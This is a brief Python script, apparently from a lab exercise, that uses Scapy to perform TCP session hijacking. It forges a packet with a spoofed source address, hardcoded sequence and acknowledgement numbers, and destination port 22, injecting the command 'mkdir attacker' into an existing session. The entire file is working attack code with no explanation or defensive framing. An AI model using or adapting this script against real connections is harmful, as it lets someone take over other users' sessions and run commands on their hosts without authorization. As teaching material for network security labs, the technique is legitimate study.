import sys
from scapy.all import *

print("Session hijacking...")
IPLayer = IP(src="10.10.10.167", dst = "10.10.10.168")
TCPLayer = TCP (sport=60720, dport=22, flags="A", seq=238418990,ack=3099545779)
Data = "\r mkdir attacker \r"
pkt=IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)

